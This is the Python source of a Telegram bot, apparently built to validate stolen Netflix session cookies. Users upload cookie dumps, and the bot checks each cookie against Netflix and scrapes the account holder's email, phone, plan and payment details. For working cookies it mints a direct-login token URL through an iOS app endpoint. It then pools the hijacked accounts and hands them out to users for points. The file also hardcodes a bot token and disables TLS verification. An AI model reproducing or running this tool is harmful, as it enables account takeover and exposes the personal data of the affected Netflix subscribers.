import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit & Channel info
OWNER_CREDIT = "Faris - https://t.me/farxxess"
CHANNEL_LINK = "https://t.me/farxxess"

# إعدادات بوت التليجرام
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
bot = telebot.TeleBot(BOT_TOKEN)

# 👑 إعدادات المطور الخاصة بك (فارس)
DEVELOPER_ID = 8713916851

STOCK_FILE = "stock_accounts.txt"
USERS_FILE = "users_data.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_users(users_data):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users_data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def add_user_if_not_exists(user_id):
    users = load_users()
    str_id = str(user_id)
    if str_id not in users:
        users[str_id] = {"points": 3, "joined_date": datetime.now().strftime('%Y-%m-%d')}
        save_users(users)

def save_to_stock(account_text):
    try:
        with open(STOCK_FILE, "a", encoding="utf-8") as f:
            f.write(account_text + "\n" + "="*40 + "\n")
    except Exception as e:
        logger.error(f"Error saving to stock: {e}")

def get_random_account_from_stock():
    if not os.path.exists(STOCK_FILE):
        return None
    try:
        with open(STOCK_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
        if not content:
            return None
        
        accounts = content.split("="*40)
        accounts = [acc.strip() for acc in accounts if acc.strip()]
        
        if not accounts:
            return None
            
        chosen_acc = random.choice(accounts)
        remaining_accounts = [acc for acc in accounts if acc != chosen_acc]
        with open(STOCK_FILE, "w", encoding="utf-8") as f:
            f.write(("\n" + "="*40 + "\n").join(remaining_accounts) + ("\n" + "="*40 + "\n" if remaining_accounts else ""))
            
        return chosen_acc
    except Exception as e:
        logger.error(f"Error getting account from stock: {e}")
        return None

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    """Convert ISO 8601 billing date to dd/MM/yyyy"""
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_next_billing_date(response_text):
    """Extract next billing date from GraphQL response"""
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        plan = unescape_plan(plan) if plan else "Unknown"

        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        plan_price = unescape_plan(plan_price) if plan_price else "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        member_since = unescape_plan(member_since) if member_since else "Unknown"

        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
        phone = phone.replace("\\x2B", "+") if phone else "Unknown"

        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"

        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"

        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"

        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email != "Unknown":
            email = urllib.parse.unquote(email)
        
        next_billing = extract_next_billing_date(txt)

        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception:
            pass
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'next_billing': format_billing_date(next_billing),
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=20, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            return {
                "status": "Success",
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    add_user_if_not_exists(user_id)
    
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
        InlineKeyboardButton("🎁 سحب حساب من الذاكرة (1 نقطة)", callback_data="btn_stock"),
        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance"),
        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
    )
    
    if user_id == DEVELOPER_ID:
        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
        
    welcome_text = "🎬 أهلاً بك في بوت فحص نتفليكس الذكي بواسطة فارس!\nاختر أحد الخيارات أدناه:"
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    users = load_users()
    str_id = str(user_id)
    
    if call.data == "btn_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📂 أرسل الآن ملف الكوكيز بصيغة `.txt` أو `.zip` وسأبدأ فحص الحسابات الشغالة تلقائياً!")
        
    elif call.data == "btn_balance":
        points = users.get(str_id, {}).get("points", 0)
        bot.answer_callback_query(call.id, text=f"رصيدك الحالي هو: {points} نقطة", show_alert=True)
        
    elif call.data == "btn_stock":
        bot.answer_callback_query(call.id)
        current_points = users.get(str_id, {}).get("points", 0)
        
        if current_points < 1:
            bot.send_message(call.message.chat.id, "❌ رصيدك غير كافٍ! تحتاج إلى نقطة واحدة (1) لسحب حساب من الذاكرة.")
            return
            
        account = get_random_account_from_stock()
        if account:
            users[str_id]["points"] -= 1
            save_users(users)
            
            markup = InlineKeyboardMarkup()
            token_match = re.search(r'nftoken=([^\s]+)', account)
            if token_match:
                t_val = token_match.group(1)
                pc_url = f"https://www.netflix.com/account?nftoken={t_val}"
                phone_url = f"https://netflix.com/unsupported?nftoken={t_val}"
                markup.add(
                    InlineKeyboardButton("💻 PC Login", url=pc_url),
                    InlineKeyboardButton("📱 Phone Login", url=phone_url)
                )
                
            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{account}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown', reply_markup=markup if token_match else None)
        else:
            bot.send_message(call.message.chat.id, "⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!")
            
    elif call.data == "btn_admin":
        if user_id != DEVELOPER_ID:
            bot.answer_callback_query(call.id, text="هذا الخيار خاص بالمطور فارس فقط!", show_alert=True)
            return
            
        bot.answer_callback_query(call.id)
        total_users = len(users)
        stock_count = 0
        if os.path.exists(STOCK_FILE):
            with open(STOCK_FILE, "r", encoding="utf-8") as f:
                stock_count = f.read().count("="*40)
                
        admin_text = (
            "⚙️ **لوحة تحكم المطور (فارس)**\n\n"
            f"👥 إجمالي المستخدمين: `{total_users}`\n"
            f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n\n"
            "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
            "`/addpoints [ID] [العدد]`"
        )
        bot.send_message(call.message.chat.id, admin_text, parse_mode='Markdown')

@bot.message_handler(commands=['addpoints'])
def add_points_command(message):
    if message.from_user.id != DEVELOPER_ID:
        return
        
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ الاستخدام الخاطئ للأمر. استخدم:\n`/addpoints [ID] [العدد]`", parse_mode='Markdown')
        return
        
    target_id = parts[1]
    try:
        amount = int(parts[2])
    except:
        bot.reply_to(message, "❌ عدد النقاط يجب أن يكون رقماً صحيحاً.")
        return
        
    users = load_users()
    if target_id in users:
        users[target_id]["points"] += amount
        save_users(users)
        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.\n💰 رصيده الحالي: {users[target_id]['points']} نقطة", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد.")

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    user_id = message.from_user.id
    add_user_if_not_exists(user_id)
    
    temp_dirs = []
    try:
        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات الشغالة واستخراج الروابط...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = message.document.file_name
        unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
        temp_dirs.append(unique_dir)
        
        file_path = os.path.join(unique_dir, filename)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        txt_files_to_check = []
        if filename.lower().endswith('.zip'):
            txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
        elif filename.lower().endswith('.txt'):
            txt_files_to_check = [file_path]
            
        if not txt_files_to_check:
            bot.reply_to(message, "❌ لم يتم العثور على ملفات نصية صالحة.")
            return
            
        valid_count = 0
        result_file_path = os.path.join(unique_dir, "the_premuim_account.txt")
        
        with open(result_file_path, "w", encoding="utf-8") as res_file:
            for txt_file in txt_files_to_check:
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    
                    for line in lines:
                        line = line.strip()
                        if not line:
                            continue
                            
                        netflix_id = extract_netflix_id(line)
                        if not netflix_id:
                            continue
                            
                        account_info = check_netflix_cookie({"NetflixId": netflix_id})
                        
                        if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                            valid_count += 1
                            token_result = generate_token(netflix_id)
                            
                            res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
                            res_msg += f"🌍 البلد: `{account_info['country']}`\n"
                            res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
                            res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
                            res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
                            res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
                            res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                            
                            markup = InlineKeyboardMarkup()
                            if token_result.get('status') == 'Success':
                                token_val = token_result['token']
                                pc_url = f"https://www.netflix.com/account?nftoken={token_val}"
                                phone_url = f"https://netflix.com/unsupported?nftoken={token_val}"
                                res_msg += f"\n📱 رابط الدخول المباشر:\n`{phone_url}`"
                                markup.add(
                                    InlineKeyboardButton("💻 PC Login", url=pc_url),
                                    InlineKeyboardButton("📱 Phone Login", url=phone_url)
                                )
                            
                            bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup if token_result.get('status') == 'Success' else None)
                            
                            res_file.write(res_msg.replace('`', '') + "\n" + "="*40 + "\n")
                            save_to_stock(res_msg.replace('`', ''))
                            time.sleep(1)
                except Exception as e:
                    logger.error(f"Error processing line/file: {e}")
                    
        if valid_count > 0 and os.path.exists(result_file_path):
            with open(result_file_path, "rb") as rf:
                bot.send_document(message.chat.id, rf, caption="📁 ملف النتائج الشامل: `the_premuim_account.txt`", parse_mode='Markdown')
                
        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال مع روابط الدخول وأزرار التصفح.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    content = message.text
    if not content or content.startswith('/'):
        return
        
    bot.reply_to(message, "⏳ جاري فحص الكوكي واستخراج رابط الدخول...")
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        bot.reply_to(message, "❌ لم يتم العثور على `NetflixId` صالح في النص.")
        return
        
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
        token_result = generate_token(netflix_id)
        
        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
        
        markup = InlineKeyboardMarkup()
        if token_result.get('status') == 'Success':
            token_val = token_result['token']
            pc_url = f"https://www.netflix.com/account?nftoken={token_val}"
            phone_url = f"https://netflix.com/unsupported?nftoken={token_val}"
            res_msg += f"\n📱 رابط الدخول المباشر:\n`{phone_url}`"
            markup.add(
                InlineKeyboardButton("💻 PC Login", url=pc_url),
                InlineKeyboardButton("📱 Phone Login", url=phone_url)
            )
            
        bot.reply_to(message, res_msg, parse_mode='Markdown', reply_markup=markup if token_result.get('status') == 'Success' else None)
    else:
        bot.reply_to(message, "❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).", parse_mode='Markdown')

if __name__ == '__main__':
    logger.info("Telegram Bot is running for Faris with active token links...")
    bot.infinity_polling()
